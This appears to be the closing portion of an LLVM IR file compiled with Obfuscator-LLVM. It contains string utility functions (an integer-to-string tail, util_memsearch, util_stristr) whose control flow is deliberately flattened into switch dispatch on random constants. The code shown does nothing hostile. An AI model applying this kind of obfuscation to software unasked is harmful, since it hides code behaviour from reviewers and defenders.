; <label>:53:                                     ; preds = %loopEntry
  %54 = load i32, i32* %11, align 4
  %55 = trunc i32 %54 to i8
  %56 = load i32, i32* %10, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds [34 x i8], [34 x i8]* %8, i64 0, i64 %57
  store i8 %55, i8* %58, align 1
  %59 = load i32, i32* %6, align 4
  %60 = load i32, i32* %12, align 4
  %61 = udiv i32 %60, %59
  store i32 %61, i32* %12, align 4
  %62 = load i32, i32* %10, align 4
  %63 = add nsw i32 %62, -1
  store i32 %63, i32* %10, align 4
  store i32 2060490613, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %65 = load i32, i32* %9, align 4
  %66 = icmp ne i32 %65, 0
  %67 = select i1 %66, i32 2132965209, i32 1253410436
  store i32 %67, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i32, i32* %10, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds [34 x i8], [34 x i8]* %8, i64 0, i64 %70
  store i8 45, i8* %71, align 1
  store i32 -1318191004, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  %73 = load i32, i32* %10, align 4
  %74 = add nsw i32 %73, 1
  store i32 %74, i32* %10, align 4
  store i32 -1318191004, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %76 = load i8*, i8** %7, align 8
  %77 = load i32, i32* %10, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds [34 x i8], [34 x i8]* %8, i64 0, i64 %78
  %80 = call i32 @util_strcpy(i8* %76, i8* %79)
  store i32 -260636667, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  %82 = load i8*, i8** %7, align 8
  %83 = getelementptr inbounds i8, i8* %82, i64 0
  store i8 48, i8* %83, align 1
  %84 = load i8*, i8** %7, align 8
  %85 = getelementptr inbounds i8, i8* %84, i64 1
  store i8 0, i8* %85, align 1
  store i32 -260636667, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i8*, i8** %7, align 8
  store i8* %87, i8** %4, align 8
  store i32 -967448581, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = load i8*, i8** %4, align 8
  ret i8* %89

loopEnd:                                          ; preds = %86, %81, %75, %72, %68, %64, %53, %50, %47, %40, %36, %35, %33, %30, %26, %21, %17, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_memsearch(i8*, i32, i8*, i32) #0 {
  %.reg2mem2 = alloca i32
  %.reg2mem = alloca i32
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  store i32 0, i32* %11, align 4
  %12 = load i32, i32* %9, align 4
  store i32 %12, i32* %.reg2mem
  %13 = load i32, i32* %7, align 4
  store i32 %13, i32* %.reg2mem2
  %switchVar = alloca i32
  store i32 -127209039, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -127209039, label %first
    i32 1326325079, label %16
    i32 624259968, label %17
    i32 476997105, label %18
    i32 852406542, label %23
    i32 -1307397232, label %38
    i32 -1007595570, label %44
    i32 -112306567, label %47
    i32 -1193803870, label %48
    i32 -1446689841, label %49
    i32 877534234, label %50
    i32 -1615441161, label %53
    i32 1882763983, label %54
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %.reload3 = load volatile i32, i32* %.reg2mem2
  %14 = icmp sgt i32 %.reload, %.reload3
  %15 = select i1 %14, i32 1326325079, i32 624259968
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 -1, i32* %5, align 4
  store i32 1882763983, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 0, i32* %10, align 4
  store i32 476997105, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* %10, align 4
  %20 = load i32, i32* %7, align 4
  %21 = icmp slt i32 %19, %20
  %22 = select i1 %21, i32 852406542, i32 -1615441161
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i8*, i8** %6, align 8
  %25 = load i32, i32* %10, align 4
  %26 = sext i32 %25 to i64
  %27 = getelementptr inbounds i8, i8* %24, i64 %26
  %28 = load i8, i8* %27, align 1
  %29 = sext i8 %28 to i32
  %30 = load i8*, i8** %8, align 8
  %31 = load i32, i32* %11, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds i8, i8* %30, i64 %32
  %34 = load i8, i8* %33, align 1
  %35 = sext i8 %34 to i32
  %36 = icmp eq i32 %29, %35
  %37 = select i1 %36, i32 -1307397232, i32 -1193803870
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load i32, i32* %11, align 4
  %40 = add nsw i32 %39, 1
  store i32 %40, i32* %11, align 4
  %41 = load i32, i32* %9, align 4
  %42 = icmp eq i32 %40, %41
  %43 = select i1 %42, i32 -1007595570, i32 -112306567
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i32, i32* %10, align 4
  %46 = add nsw i32 %45, 1
  store i32 %46, i32* %5, align 4
  store i32 1882763983, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  store i32 -1446689841, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 -1446689841, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  store i32 877534234, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i32, i32* %10, align 4
  %52 = add nsw i32 %51, 1
  store i32 %52, i32* %10, align 4
  store i32 476997105, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  store i32 -1, i32* %5, align 4
  store i32 1882763983, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i32, i32* %5, align 4
  ret i32 %55

loopEnd:                                          ; preds = %53, %50, %49, %48, %47, %44, %38, %23, %18, %17, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_stristr(i8*, i32, i8*) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8, align 1
  %12 = alloca i8, align 1
  store i8* %0, i8** %5, align 8
  store i32 %1, i32* %6, align 4
  store i8* %2, i8** %7, align 8
  %13 = load i8*, i8** %5, align 8
  store i8* %13, i8** %8, align 8
  %14 = load i8*, i8** %7, align 8
  %15 = call i32 @util_strlen(i8* %14)
  store i32 %15, i32* %9, align 4
  store i32 0, i32* %10, align 4
  %switchVar = alloca i32
  store i32 -1354653431, i32* %switchVar
  %.reg2mem = alloca i32
  %.reg2mem2 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1354653431, label %16
    i32 -1305437659, label %21
    i32 -469258056, label %34
    i32 -766239076, label %39
    i32 -1985264151, label %43
    i32 -846395296, label %46
    i32 -1566756571, label %52
    i32 -1072585546, label %57
    i32 -1693107193, label %61
    i32 -1356585904, label %64
    i32 1995152467, label %72
    i32 -872250425, label %78
    i32 -709380200, label %85
    i32 -1873440252, label %86
    i32 -1901270727, label %87
    i32 -1020870820, label %88
    i32 884363765, label %89
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = load i32, i32* %6, align 4
  %18 = add nsw i32 %17, -1
  store i32 %18, i32* %6, align 4
  %19 = icmp sgt i32 %17, 0
  %20 = select i1 %19, i32 -1305437659, i32 -1020870820
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = load i8*, i8** %8, align 8
  %23 = getelementptr inbounds i8, i8* %22, i32 1
  store i8* %23, i8** %8, align 8
  %24 = load i8, i8* %22, align 1
  store i8 %24, i8* %11, align 1
  %25 = load i8*, i8** %7, align 8
  %26 = load i32, i32* %10, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds i8, i8* %25, i64 %27
  %29 = load i8, i8* %28, align 1
  store i8 %29, i8* %12, align 1
  %30 = load i8, i8* %11, align 1
  %31 = sext i8 %30 to i32
  %32 = icmp sge i32 %31, 65
  %33 = select i1 %32, i32 -469258056, i32 -1985264151
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  %35 = load i8, i8* %11, align 1
  %36 = sext i8 %35 to i32
  %37 = icmp sle i32 %36, 90
  %38 = select i1 %37, i32 -766239076, i32 -1985264151
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i8, i8* %11, align 1
  %41 = sext i8 %40 to i32
  %42 = or i32 %41, 96
  store i32 -846395296, i32* %switchVar
  store i32 %42, i32* %.reg2mem
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  %44 = load i8, i8* %11, align 1
  %45 = sext i8 %44 to i32
  store i32 -846395296, i32* %switchVar
  store i32 %45, i32* %.reg2mem
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %.reload = load i32, i32* %.reg2mem
  %47 = trunc i32 %.reload to i8
  store i8 %47, i8* %11, align 1
  %48 = load i8, i8* %12, align 1
  %49 = sext i8 %48 to i32
  %50 = icmp sge i32 %49, 65
  %51 = select i1 %50, i32 -1566756571, i32 -1693107193
  store i32 %51, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i8, i8* %12, align 1
  %54 = sext i8 %53 to i32
  %55 = icmp sle i32 %54, 90
  %56 = select i1 %55, i32 -1072585546, i32 -1693107193
  store i32 %56, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = load i8, i8* %12, align 1
  %59 = sext i8 %58 to i32
  %60 = or i32 %59, 96
  store i32 -1356585904, i32* %switchVar
  store i32 %60, i32* %.reg2mem2
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i8, i8* %12, align 1
  %63 = sext i8 %62 to i32
  store i32 -1356585904, i32* %switchVar
  store i32 %63, i32* %.reg2mem2
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %.reload3 = load i32, i32* %.reg2mem2
  %65 = trunc i32 %.reload3 to i8
  store i8 %65, i8* %12, align 1
  %66 = load i8, i8* %11, align 1
  %67 = sext i8 %66 to i32
  %68 = load i8, i8* %12, align 1
  %69 = sext i8 %68 to i32
  %70 = icmp eq i32 %67, %69
  %71 = select i1 %70, i32 1995152467, i32 -1873440252
  store i32 %71, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  %73 = load i32, i32* %10, align 4
  %74 = add nsw i32 %73, 1
  store i32 %74, i32* %10, align 4
  %75 = load i32, i32* %9, align 4
  %76 = icmp eq i32 %74, %75
  %77 = select i1 %76, i32 -872250425, i32 -709380200
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i8*, i8** %8, align 8
  %80 = load i8*, i8** %5, align 8
  %81 = ptrtoint i8* %79 to i64
  %82 = ptrtoint i8* %80 to i64
  %83 = sub i64 %81, %82
  %84 = trunc i64 %83 to i32
  store i32 %84, i32* %4, align 4
  store i32 884363765, i32* %switchVar
  br label %loopEnd

; <label>:85:                                     ; preds = %loopEntry
  store i32 -1901270727, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  store i32 0, i32* %10, align 4
  store i32 -1901270727, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  store i32 -1354653431, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  store i32 -1, i32* %4, align 4
  store i32 884363765, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  %90 = load i32, i32* %4, align 4
  ret i32 %90

loopEnd:                                          ; preds = %88, %87, %86, %85, %78, %72, %64, %61, %57, %52, %46, %43, %39, %34, %21, %16, %switchDefault
  br label %loopEntry
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind }
attributes #7 = { nounwind readnone }
attributes #8 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146842976}
!2 = !{i32 -2146842567}
